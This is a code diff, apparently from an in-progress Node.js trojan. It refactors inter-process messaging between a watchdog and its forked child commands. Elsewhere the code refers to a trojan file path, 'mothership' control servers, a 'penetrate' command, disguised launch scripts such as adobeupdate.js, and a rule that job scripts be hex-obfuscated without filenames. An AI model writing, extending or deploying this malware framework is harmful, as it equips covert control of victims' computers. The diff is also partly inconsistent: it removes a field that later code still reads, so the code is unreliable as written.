@@ -13,6 +13,9 @@ const { fork } = require('child_process');
 
 const ISDEBUG = true;
 
+// { CommandLine:'...', Name:'...', ProcessId:'...' }
+var processlist = [];
+
 // ! logging
 
 // ! all job scripts need to be obfuscated using hex string -- no file extensions, no filenames
@@ -78,8 +81,6 @@ var systemstate = {
             return 'init';
     },
 
-    childcmds: [],
-
     __cmdconfig: null,
 
     get cmdconfig() {
@@ -136,13 +137,12 @@ var systemstate = {
         return mothershiparr[this.mothershipindex];    
     },
 
-
     __clientid: '',
 
     get clientid() {
         if (isNullOrWhitespace(this.__clientid)) {
             
-            if ( fileExists(systemstate.clientidfpat) )
+            if ( fileExists(systemstate.clientidfpath) )
                 this.__clientid = readTag(systemstate.clientidfpath);
 
         }
@@ -175,8 +175,6 @@ var systemstate = {
     get trojanfpath() {
         return path.join(this.trojandir, this.trojanfname);
     },
-
-    processlist:[],
 
     get scriptpid() {
         return process.pid;
@@ -292,11 +290,10 @@ class CmdConfig {
     #cmdname = '';
     #launchprocname = ''; // node.exe, cmd.exe, powershell.exe, python.exe, cscript.exe, ...
     #launchscriptfname = ''; // noderelay.js, pythonrelay.js, adobeupdate.js, pc_monitoring.ps1, <...>.vbs, <...>.bat, <...>.js
-    #childprocess = null;
-    
-    loopfunc = async () => { logmsg('looping'); };
+    #childprocess = null; 
+    #childcmds = [];
 
-    // TODO: runonce --> should be executed by cmdlist
+    loopfunc = async () => { logmsg('doing some work inside loop...'); }; // should be overriden
 
     parentcmdconfig = null;
 
@@ -306,7 +303,6 @@ class CmdConfig {
         else
             throw new Error('cmd is not supported ['+tcmdname+']');
     };
-
 
     static cmdfuncs = {
         penetrate: penetrate,
@@ -373,14 +369,48 @@ class CmdConfig {
         logmsg('finished');
     };
 
+    // used by watchdog to relay messages between child cmds
+    processMessage(msg) {
+        // TODO: parent function to process incomming messages from child processes
+        // extract dest, send message to other child
+    };
+
+    sendMessage(childcmd, msgpayload) {
+        let childp = childcmd.childprocess;
+
+        if ( ! childp ) {
+            throw new Error('childcmd does not have valid child process');
+        }
+
+        if ( ! isChildHealthy(childp) ) {
+            throw new Error('childprocess is not healthy');
+        }
+        
+        let msgout = {
+            senderPid:process.pid,
+            src:systemstate.cmdname,
+            dest:childcmd.cmdname,
+            payload:msgpayload,
+            ts:getTimestamp()
+        }
+
+        if ( childp.writable && ! childp.killed ) {
+            childp.send(msgout);
+        }
+
+    };
+
     launch() {
 
         logmsg("launching ["+this.cmdname+"]");
 
+        // TODO: refactor to use #launchprocname and #launchscriptfname
+        // ! this is only for node.exe and nodejs scripts
         const child = fork(systemstate.trojanfpath, [this.cmdname]);
         
         this.childprocess = child;
         this.launchprocname = path.basename(child.spawnargs[0]);
+        this.launchscriptfname = path.basename(systemstate.trojanfpath);
 
         let tchildproc = getProcess(child.pid);
 
@@ -390,19 +420,15 @@ class CmdConfig {
         writeTag(this.cmdpidfpath, String(child.pid));
         
         child.on('message', (message) => {
-            logmsg('[PARENT] received from child: ' + JSON.stringify(message));
+            logmsg('incomming message: ' + JSON.stringify(message));
+
+            this.processMessage(message);
         });
-        
-        const payload = { task: 'compute', data: [10, 20, 30] };
-        logmsg('[PARENT] sending payload to child...' + JSON.stringify(payload));
-        if (child.writable && !child.killed) {       
-            child.send(payload);
-        }
         
         child.on('exit', (code) => {
             logmsg(`Child process ${child.pid} exited with code ${code}`);
         });
-        
+
     };
 
     exitramp() {
@@ -455,6 +481,15 @@ class CmdConfig {
     
 };
 
+function isChildHealthy(childProcess) {
+    return (
+      childProcess !== null &&
+      childProcess.pid !== undefined &&     // Has a valid Process ID
+      childProcess.killed === false &&      // Has not been sent a kill signal
+      childProcess.connected === true       // IPC channel is open and ready
+    );
+  }
+  
 function ensureSingleInstancePipe(loopfunc) {
     const PIPE_NAME = '\\\\.\\pipe\\' + systemstate.lockfname;
 
@@ -503,7 +538,7 @@ function getFileMD5(fpath) {
     return crypto.createHash('md5').update(fileBuffer).digest('hex');  
 }
 
-function getProcessList() {
+function initProcessList() {
     const psCommand = `Get-CimInstance Win32_Process | Select-Object ProcessId, Name, CommandLine | ConvertTo-Json`;
     
     exec(`powershell.exe -NoProfile -Command "${psCommand}"`, { maxBuffer: 1024 * 1024 * 10 }, (error, stdout, stderr) => {
@@ -520,7 +555,7 @@ function getProcessList() {
             const processes = JSON.parse(stdout);
             
             logmsg('process list count: '+processes.length);
-            systemstate.processlist = processes;
+            processlist = processes;
             /*  CommandLine =
                 Name =
                 ProcessId = */
@@ -536,17 +571,15 @@ function getProcess(pid) {
     // Name
     // ProcessId
     
-    let plist = systemstate.processlist.processlist;
-
-    if ( plist && plist.length >= 1 ) {
-        for ( let i = 0; i<plist.length; i++ ) {
-            if ( plist[i].ProcessId == pid )
-                return plist[i];
+    if ( processlist && processlist.length >= 1 ) {
+        for ( let i = 0; i<processlist.length; i++ ) {
+            if ( processlist[i].ProcessId == pid )
+                return processlist[i];
         }
     }
 
     return null;
-};
+}
 
 function loopWithTimeout() {
     console.log("Running task...");
@@ -586,7 +619,6 @@ function getRandomCode(n) {
 function isNullOrWhitespace(str) {
     return !str || !str.trim();
 }
-
 
 function getCallerName() {
     const originalFunc = Error.prepareStackTrace;
@@ -846,34 +878,35 @@ function isAsyncFunction(fn) {
 logmsg("starting -- cmdname=" + systemstate.cmdname + ' ts='+systemstate.scriptts);
 logmsg('scriptmd5='+systemstate.scriptmd5);
 
-getProcessList();
+initProcessList();
 
 ensureSingleInstancePipe(systemstate.cmdconfig.cmdfunc);
 
-// --- IPC
+// --- IPC for current running process: message send/receive
 
-const hasParent = typeof process.send === 'function';
-const parentPid = process.ppid;
+// receives messages from parent process -- should be used by cmdlist, ping
+process.on('message', (message) => {
+    // TODO: process incoming messages
 
-if (hasParent) {
-    logmsg('[CHILD] IPC channel active. Connected to parent. Parent pid='+parentPid);
+    logmsg(`[CHILD] received from parent:` + JSON.stringify(message));
 
-    process.send({ direction:'child-to-parent', status: 'ready', ts:getTimestamp(), cmdname:systemstate.cmdname });
+});
 
-    process.on('message', (message) => {
-        logmsg(`[CHILD] received from parent:` + JSON.stringify(message));
+// sends message to parent process -- should be called by cmdlist, ping
+function sendMessage(dest, msgpayload) {
+    let isvalid = (typeof process.send === 'function' && process.connected );
+    const parentPid = process.ppid;
 
-        if (message.command === 'START_TASK') {
-            const result = message.data.items.map(x => x * 2);
+    if (! isvalid) {
+        throw new Error('this process does not have a parent process to communicate with');
+        return;
+    }
 
-            if (hasParent) {
-                process.send({ direction:'child-to-parent', status: 'completed', ts:getTimestamp(), result:result,cmdname:systemstate.cmdname });
-            }
-        }
-    });
-} else {
-    logmsg('[CHILD] Running standalone. No parent process detected.');
+    logmsg('[CHILD] sending message to parent pid=' + parentPid);
+    
+    process.send({ senderPid:process.pid, src:systemstate.cmdname, dest:dest, payload:msgpayload, ts:getTimestamp()  });    
 }
+
 
 // ---
 
@@ -904,7 +937,7 @@ function watchdog() {
     let ping = new CmdConfig('ping');
     let cmdlist = new CmdConfig('cmdlist');
     
-    let childcmds = systemstate.childcmds;
+    let childcmds = systemstate.childcmds; // revise this to shift childcmds to systemstate.cmdconfig
 
     childcmds.push(ping, cmdlist);
     
